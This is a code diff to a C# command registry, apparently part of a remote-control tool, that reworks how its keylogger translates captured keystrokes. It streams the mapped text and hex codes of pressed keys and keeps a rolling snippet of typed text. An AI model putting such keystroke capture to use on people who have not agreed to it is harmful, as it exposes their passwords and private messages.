@@ -26,7 +26,7 @@ public static class CommandRegistry
     public static ScriptScope PythonScope = PythonEngine.CreateScope();
     private static bool KeylogActive = false;
     private static Func<List<uint>> KeylogKeyProvider = Keylogger.GetPressingKeys;
-    private static Func<uint, char> KeylogKeyMapper = WinAPI.MapVirtualKey;
+    private static Func<IReadOnlyCollection<uint>, WinAPI.KeyTranslationResult> KeylogKeyMapper = WinAPI.TranslateKeyCombination;
     internal static Func<ProcessStartInfo, Process?> ProcessStarter { get; set; } = info => Process.Start(info);
     internal static Func<string?, string?, IntPtr> WindowFinder { get; set; } = WinAPI.FindWindow;
     internal static Func<IntPtr> ForegroundWindowGetter { get; set; } = WinAPI.GetForegroundWindow;
@@ -1321,19 +1321,33 @@ public static class CommandRegistry
                         {
                             if (keys.Count > 0)
                             {
-                                var mappedBatch = string.Join(' ', keys.Select(KeylogKeyMapper));
-                                var unmappedBatch = string.Join(' ', keys.Select(key => key.ToString("X")));
+                                var translation = KeylogKeyMapper(keys);
+                                var mappedBatch = translation.Text;
+                                var unmappedBatch = translation.HexFallback;
 
                                 await streamWriter.WriteLineAsync($"Mapped: {mappedBatch}");
                                 await streamWriter.WriteLineAsync($"Unmapped: {unmappedBatch}");
                                 await streamWriter.WriteLineAsync(string.Empty);
                                 await streamWriter.FlushAsync();
 
-                                snippetBuilder.Append(mappedBatch);
-                                snippetBuilder.Append(' ');
-                                if (snippetBuilder.Length > snippetMaxLength)
+                                var snippetSegment = translation.Text;
+
+                                if (!string.IsNullOrEmpty(snippetSegment))
                                 {
-                                    snippetBuilder.Remove(0, snippetBuilder.Length - snippetMaxLength);
+                                    snippetBuilder.Append(snippetSegment);
+
+                                    if (translation.ContainsFallbackPlaceholders)
+                                    {
+                                        if (snippetBuilder[^1] != ' ')
+                                        {
+                                            snippetBuilder.Append(' ');
+                                        }
+                                    }
+
+                                    if (snippetBuilder.Length > snippetMaxLength)
+                                    {
+                                        snippetBuilder.Remove(0, snippetBuilder.Length - snippetMaxLength);
+                                    }
                                 }
                             }
 
